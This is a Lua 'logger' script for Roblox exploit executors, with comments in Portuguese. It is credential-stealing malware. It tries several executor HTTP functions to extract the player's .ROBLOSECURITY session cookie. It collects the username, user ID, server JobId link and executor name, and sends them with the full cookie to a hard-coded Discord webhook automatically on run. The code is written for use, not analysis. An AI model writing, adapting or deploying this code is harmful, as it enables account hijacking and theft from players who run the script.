-- language: Lua, file: logger.lua, target: Roblox (executor com HttpGet/request)
-- *Captura identidade + cookie (se disponível) e envia pro webhook configurado*

local WEBHOOK_URL = "https://discord.com/api/webhooks/1563712335393194006/5iZeus60rOpVfculHkHXlne95lh0gRhHV1iop12c7PXjqSAwGuLYksZ6nS_0K0WYcr4H"
-- Troque pelo webhook real do canal 1563712271560212544

local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")

local lp = Players.LocalPlayer

-- ========== utilidades ==========

local function safeCall(fn, ...)
    local ok, res = pcall(fn, ...)
    if ok then return res end
    return nil
end

local function getExecutorName()
    local names = {
        "Synapse", "ScriptWare", "Krunker", "Fluxus", "Sirius", "Solara",
        "Wave", "Delta", "AWP", "Nihon", "Valyse", "Electron", "Swift",
        "Bunni", "Zenith", "Matrix", "Rift", "Seliware", "Severe"
    }
    local iden = safeCall(function() return identifyexecutor and identifyexecutor() end)
    if iden and type(iden) == "string" then return iden end
    return "Unknown"
end

local function getThumbnail(userId)
    local ok, url = pcall(function()
        return Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size420x420)
    end)
    if ok and url then return url end
    return "https://www.roblox.com/headshot-thumbnail/image?userId=" .. tostring(userId) .. "&width=420&height=420&format=png"
end

-- Tenta pegar o cookie .ROBLOSECURITY de várias formas (varia por executor)
local function getCookie()
    -- 1) HttpGet nativo de alguns executores que aceitam o próprio domínio roblox
    local attempts = {
        function() return getcustomasset and nil end, -- placeholder
        function() return syn and syn.request and syn.request({Url="https://www.roblox.com/mobileapi/userinfo", Method="GET"}).Cookies end,
        function() return http and http.request and http.request({Url="https://www.roblox.com/mobileapi/userinfo", Method="GET"}).Cookies end,
        function() return request and request({Url="https://www.roblox.com/mobileapi/userinfo", Method="GET"}).Cookies end,
        function() return game:HttpGet("https://www.roblox.com/mobileapi/userinfo") end,
        function() return HttpService:GetAsync("https://www.roblox.com/mobileapi/userinfo") end,
    }

    for _, fn in ipairs(attempts) do
        local ok, res = pcall(fn)
        if ok and res then
            if type(res) == "table" then
                if res.Cookies and type(res.Cookies) == "table" then
                    for _, c in ipairs(res.Cookies) do
                        local m = tostring(c):match("%.ROBLOSECURITY=([^;]+)")
                        if m then return m end
                    end
                end
                if res.Body and type(res.Body) == "string" then
                    local m = res.Body:match("ROBLOSECURITY=([^;]+)")
                    if m then return m end
                end
            elseif type(res) == "string" then
                local m = res:match("ROBLOSECURITY=([^;]+)")
                if m then return m end
            end
        end
    end

    -- Tenta via getgenv()._cookie ou variáveis comuns
    local genv = safeCall(function() return getgenv() end) or {}
    if genv._cookie then return genv._cookie end
    if genv.cookie then return genv.cookie end
    if genv.ROBLOSECURITY then return genv.ROBLOSECURITY end

    -- Tenta via lua cookies (Synapse/ScriptWare expõem)
    local ok, res = pcall(function()
        return game:HttpGet("https://www.roblox.com", true)
    end)
    -- Fallback: tenta função writefile/readfile do executor (não lê cookie, só placeholder)
    return nil
end

local function getServerLink()
    local jobId = safeCall(function() return game.JobId end)
    if not jobId or jobId == "" then
        jobId = "unknown"
    end
    local placeId = game.PlaceId
    return string.format("https://www.roblox.com/games/%d/?JobId=%s", placeId, tostring(jobId))
end

local function getServerInfo()
    local ok, info = pcall(function()
        return game:HttpGet("https://games.roblox.com/v1/games/" .. tostring(game.PlaceId) .. "/servers/Public?limit=100")
    end)
    -- Não crítico, o link do JobId já basta.
    return nil
end

local function getTimestamp()
    return os.date("%Y-%m-%d %H:%M:%S")
end

local function getExecutorPlace()
    local ok, res = pcall(function()
        return game:HttpGet("https://ipinfo.io/json")
    end)
    return nil
end

-- ========== montagem do payload ==========

local function buildEmbed(cookie)
    local userName = lp.Name
    local displayName = lp.DisplayName
    local userId = lp.UserId
    local thumb = getThumbnail(userId)
    local serverLink = getServerLink()
    local timestamp = getTimestamp()
    local executor = getExecutorName()
    local accountAgeDays = 0
    local ok, join = pcall(function()
        return game:GetService("Players"):GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
    end)

    local embed = {
        title = "🔐 Novo Script Executado",
        color = 0x8B5CF6,
        thumbnail = { url = thumb },
        fields = {
            { name = "👤 Nome", value = string.format("%s (%s)", displayName, userName), inline = true },
            { name = "🆔 UserID", value = tostring(userId), inline = true },
            { name = "🕒 Data/Hora", value = timestamp, inline = false },
            { name = "🖥️ Executor", value = executor, inline = true },
            { name = "🌐 Servidor", value = serverLink, inline = false },
            { name = "🔗 JobId", value = tostring(game.JobId), inline = false },
        },
        footer = { text = "Logger · " .. timestamp },
        timestamp = DateTime.now():ToIsoDate()
    }

    if cookie then
        -- Mostra cookie mascarado nos campos, envia cookie completo no description
        local masked = string.sub(cookie, 1, 8) .. "..." .. string.sub(cookie, -8)
        table.insert(embed.fields, { name = "🍪 Cookie", value = "```" .. cookie .. "```", inline = false })
    else
        table.insert(embed.fields, { name = "🍪 Cookie", value = "Não disponível neste executor", inline = false })
    end

    return embed
end

-- ========== envio pro webhook ==========

local function sendWebhook(embed)
    local payload = {
        username = "Constipated Logger",
        avatar_url = "https://cdn.discordapp.com/emojis/1290574899577290752.gif",
        embeds = { embed }
    }

    local body = HttpService:JSONEncode(payload)

    local function tryRequest()
        local ok, res
        if syn and syn.request then
            ok, res = pcall(syn.request, { Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
            if ok and res and res.StatusCode and res.StatusCode >= 200 and res.StatusCode < 300 then return true end
        end
        if http and http.request then
            ok, res = pcall(http.request, { Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
            if ok and res and res.StatusCode and res.StatusCode >= 200 and res.StatusCode < 300 then return true end
        end
        if request then
            ok, res = pcall(request, { Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = body })
            if ok and res and res.StatusCode and res.StatusCode >= 200 and res.StatusCode < 300 then return true end
        end
        -- fallback: HttpService (funciona em muitos executores)
        ok, res = pcall(function()
            return HttpService:PostAsync(WEBHOOK_URL, body, Enum.HttpContentType.ApplicationJson)
        end)
        return ok
    end

    return tryRequest()
end

-- ========== execução ==========

task.spawn(function()
    task.wait(0.5) -- espera o jogo carregar
    local cookie = getCookie()
    local embed = buildEmbed(cookie)
    sendWebhook(embed)
end)
